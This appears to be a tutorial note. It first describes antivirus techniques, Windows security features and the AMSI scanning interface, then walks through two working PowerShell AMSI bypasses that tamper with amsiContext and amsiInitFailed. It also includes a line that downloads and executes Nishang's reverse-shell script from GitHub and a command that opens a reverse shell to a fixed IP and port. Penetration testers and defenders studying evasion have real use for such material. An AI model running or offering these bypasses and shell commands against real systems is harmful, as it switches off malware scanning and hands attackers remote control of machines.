
---
### **1. What is an Antivirus?**

An **antivirus** is a software that helps detect and remove harmful programs (malware). Antivirus software identifies malware using different techniques:

- **Signature-Based Detection** – Checks files against a database of known malware.
    
- **Static Analysis** – Examines a file's structure to detect harmful patterns.
    
- **Dynamic Analysis** – Runs the file in a safe environment (sandbox) to monitor its behavior.
    
- **Machine Learning Analysis** – Uses AI to detect suspicious patterns.
    

### **1.1 Related Security Technologies**

Antivirus works alongside other security tools, such as:

- **Firewalls** – Block harmful network traffic.
    
- **Intrusion Detection Systems (IDS)** – Detect and stop cyber attacks.
    
- **Endpoint Detection and Response (EDR)** – Protects devices from cyber threats.
    

---

### **2. Windows and Security Features**

Windows has built-in security tools to protect the system:

- **Windows Defender Antivirus** – Default antivirus for Windows.
    
- **Firewall & Network Protection** – Blocks harmful network connections.
    
- **Windows Hello** – Secure login using biometrics (fingerprint, face recognition).
    
- **BitLocker** – Encrypts your files to prevent unauthorized access.
    
- **Secure Boot** – Ensures only trusted software loads when Windows starts.
    

---

### **2.1 What is AMSI (Windows Antimalware Scan Interface)?**

**AMSI (Antimalware Scan Interface)** is a Windows feature introduced in 2015 that helps detect malicious activities.

🔍 **How AMSI Works:**

1. A program requests a security scan.
    
2. AMSI sends the request to an antivirus installed on the system.
    
3. The antivirus scans the data and checks for malware.
    
4. The result is sent back to the program.
    

✅ **AMSI can scan:**

- **PowerShell scripts**
    
- **JavaScript & VBScript**
    
- **Office Macros (VBA)**
    
- **Windows Management Instrumentation (WMI)**
    
- **.NET framework applications**
    

📌 **Commands to check AMSI on a system:**

- **List AMSI-related DLLs:**
    
    ```powershell
    tasklist /m amsi*
    ```
    
- **Check active AMSI providers:**
    
    ```powershell
    Get-WmiObject -Namespace "root\SecurityCenter2" -Class AntiVirusProduct | Select-Object DisplayName, PathToSignedProductExe, ProductState
    ```
    

🖥 **How AMSI interacts with programs:**  
When PowerShell or another script runs, Windows automatically scans it with AMSI before execution:

```c
// AMSI Function Calls
hResult = AmsiInitialize(APP_NAME, &amsiContext);
hResult = AmsiOpenSession(amsiContext, &session);
hResult = AmsiScanBuffer(amsiContext, content, contentSize, fname, session, &amsiRes);
```

These functions ensure scripts are scanned before running.

---

### **3. Bypassing AMSI**

AMSI blocks suspicious scripts, including **hacking tools** like `Invoke-PowerShellTcp.ps1` (a reverse shell script).

If we try to run it with AMSI **enabled**, we get this error:

```powershell
iex : This script contains malicious content and has been blocked by your antivirus software.
```

👉 **Solution? Bypass AMSI!**  
AMSI can be bypassed by modifying certain structures in memory.

---

### **3.1 AMSI Bypass #1 – Modifying the `amsiContext` Field**

AMSI uses an internal structure called `amsiContext` in the `.NET` class `AmsiUtils`. If we **overwrite this structure**, AMSI will **stop scanning scripts**.

📌 **Steps:**

1. Open PowerShell.
    
2. Run the following command to modify `amsiContext`:
    
    ```powershell
    $fields=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetFields('NonPublic,Static')
    $amsiContext=$fields | Where-Object { $_ -like "*Context" }
    [IntPtr]$amsiContextPointer=$amsiContext.GetValue($null)
    [Int32[]]$emptyBuffer = @(0);
    [System.Runtime.InteropServices.Marshal]::Copy($emptyBuffer, 0, $amsiContextPointer, 1)
    ```
    
3. Try running the blocked script again:
    
    ```powershell
    iex (iwr "https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1" -UseBasicParsing).Content
    ```
    
    Now, AMSI **does not block the script** anymore!
    
4. Start a **reverse shell**:
    
    ```powershell
    Invoke-PowerShellTcp -Reverse -IPAddress 192.168.122.1 -Port 4321
    ```
    
    The shell opens successfully because AMSI scanning is **disabled**.
    

---

### **3.2 AMSI Bypass #2 – Setting `amsiInitFailed` to `True`**

Instead of modifying `amsiContext`, another way to disable AMSI is by setting `amsiInitFailed` to `true`.

📌 **Steps:**

1. Open PowerShell.
    
2. Run this command:
    
    ```powershell
    $amsiInitFailedField=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetFields('NonPublic,Static') | Where-Object { $_.Name -like "amsiInitFailed" }
    $amsiInitFailedField.SetValue($null, $true)
    ```
    
3. Now, AMSI **stops working**, and PowerShell scripts run **without detection**.
    

---

### **4. References**

- [AMSI Bypass Techniques – YouTube](https://www.youtube.com/watch?v=8y8saWvzeLw)
    
- [GitHub – AMSI Bypass](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell)
    
- [AMSI One-liner Bypass](https://arttoolkit.github.io/wadcoms/AMSI-Bypass-amsiContext/)
    
- [All AMSI Bypass Methods (2022)](https://gist.github.com/D3Ext/bf57673644ba08e729f65892e0dae6c4)
    

---
